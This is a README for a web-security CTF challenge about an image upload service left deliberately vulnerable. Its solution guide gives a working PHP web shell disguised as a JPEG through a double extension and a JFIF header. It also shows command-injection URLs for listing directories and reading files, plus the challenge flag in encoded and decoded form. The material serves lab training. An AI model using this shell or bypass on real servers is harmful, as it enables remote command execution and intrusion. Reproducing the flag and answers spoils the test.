# ImageUploader CTF Challenge

## Challenge Details

### Category
- Web Security
- File Upload Vulnerability
- Command Injection
- Base64 Encoding

### Description
ImageUploader is a seemingly innocent image upload service that contains multiple security vulnerabilities. Participants must exploit file upload restrictions and use command injection to discover and decode a hidden flag.

### Difficulty Level
- Medium

## Technical Details

### Security Flaws
1. **Insecure File Upload**
   - The application only checks file extensions
   - Double extension bypass possible (e.g., `shell.php.jpg`)
   - No proper MIME type validation

2. **Command Injection**
   - Uploaded PHP files are executed as PHP code
   - GET parameter allows arbitrary command execution

3. **Information Disclosure**
   - Directory listing enabled in uploads folder
   - Base64 encoded flag stored in predictable location

## Hosting Requirements

### Prerequisites
- Docker
- Docker Compose
- Git (optional)

### Installation & Deployment

1. **Clone the Repository**
```bash
[git clone [https://github.com/YASHRVY7/CTF7.git]
cd CTF7
```

2. **Build and Run with Docker**
```bash
docker-compose up --build
```

3. **Access the Challenge**
- Open browser and navigate to: `http://localhost:8080`

## Solution Guide

### Step 1: Create Payload
Create a file named `shell.php.jpg` with the following content:
```php
JFIF;
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Command received: $cmd<br>";
    echo "Executing...<br>";
    system($cmd, $retval);
    echo "Return value: $retval<br>";
} else {
    echo "No command provided.";
}
?>
```

### Step 2: Upload and Execute
1. Upload the `shell.php.jpg` file through the web interface
2. Navigate to `/uploads/shell.php.jpg` in the browser

### Step 3: Find the Flag
This step involves exploring the server's file system to locate and retrieve the hidden flag. The process requires multiple commands and careful enumeration:

1. **Initial Directory Enumeration**
   ```
   # First, check the root of hidden directory
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/
   
   # Then explore level1 directory
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/level1/
   
   # Finally, check level2 directory
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/level1/level2/
   ```

   **Example Exploration Process:**
   1. First, list contents of /var directory:
   ```
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20/var

   Expected Output:
   Command received: ls /var
   Executing...
   backups  cache  hidden  lib  local  lock  log  mail  opt  run  spool  tmp  www
   Return value: 0
   ```
   Note: The `hidden` directory in the output confirms our target location.

   2. Explore the hidden directory:
   ```
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20/var/hidden

   Expected Output:
   Command received: ls /var/hidden
   Executing...
   level1
   Return value: 0
   ```
   This confirms the nested directory structure and guides our next steps.

2. **Advanced Enumeration Techniques**
   - If standard `ls` is blocked, try alternatives:
   ```
   # Using find command
   http://localhost:8080/uploads/shell.php.jpg?cmd=find /var/hidden -type f
   
   # Using dir command
   http://localhost:8080/uploads/shell.php.jpg?cmd=dir /var/hidden/level1/level2/
   ```

3. **Reading the Flag File**
   - Multiple methods to read the flag content:
   ```
   # Using cat (primary method)
   http://localhost:8080/uploads/shell.php.jpg?cmd=cat /var/hidden/level1/level2/secret_flag.txt
   
   # Alternative reading methods if cat is blocked
   http://localhost:8080/uploads/shell.php.jpg?cmd=head -n 1 /var/hidden/level1/level2/secret_flag.txt
   http://localhost:8080/uploads/shell.php.jpg?cmd=more /var/hidden/level1/level2/secret_flag.txt
   http://localhost:8080/uploads/shell.php.jpg?cmd=less /var/hidden/level1/level2/secret_flag.txt
   ```

## Available Hints
1. "Check the MIME type bypass techniques"
2. "The flag is hidden deeper than you think"
3. "Multiple encodings might be involved"


## Security Measures
- Apache mod_security enabled
- Security headers configured
- File extension validation
- Upload directory permissions set
- Flag file permissions restricted
- Base64 encoded flag

## Flag Format
- Encoded: `Q1RGe1RoMXNfMXNfWU91cl9GbDRnX0MwbmdyNHR6X1kwdV9GMHVuZF9JdH0=`
- Decoded: `CTF{Th1s_1s_YOur_Fl4g_C0ngr4tz_Y0u_F0und_It}`

## Payload Explanation

The payload (`shell.php.jpg`) is crafted to bypass upload restrictions and enable command execution. Let's break down each component:

### 1. File Name Structure
- `shell.php.jpg`: Uses double extension to bypass file type checks
  - The server sees `.jpg` and thinks it's an image
  - But PHP will still execute it as `.php` file

### 2. Content Breakdown
```php
JFIF;
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Command received: $cmd<br>";
    echo "Executing...<br>";
    system($cmd, $retval);
    echo "Return value: $retval<br>";
} else {
    echo "No command provided.";
}
?>
```

#### Key Components:
1. **JFIF Header**
   - `JFIF;` at the start tricks MIME type checks
   - Makes the file look like a valid JPEG image

2. **PHP Code Section**
   - `isset($_GET['cmd'])`: Checks if a command was provided in URL
   - `$cmd = $_GET['cmd']`: Retrieves the command from GET parameter
   - `system($cmd, $retval)`: Executes the system command
   - `$retval`: Captures the command's exit status

3. **Output Structure**
   - Shows received command
   - Indicates execution status
   - Displays command output
   - Shows return value for debugging

### Usage Example
```
http://localhost:8080/uploads/shell.php.jpg?cmd=whoami
```

### Security Implications
- Allows remote command execution
- Bypasses file upload restrictions
- Provides detailed command execution feedback
- Can be used to explore server filesystem
- Enables privilege escalation attempts

Note: This payload is for educational purposes in CTF challenges. Using such code in production environments would create serious security vulnerabilities.
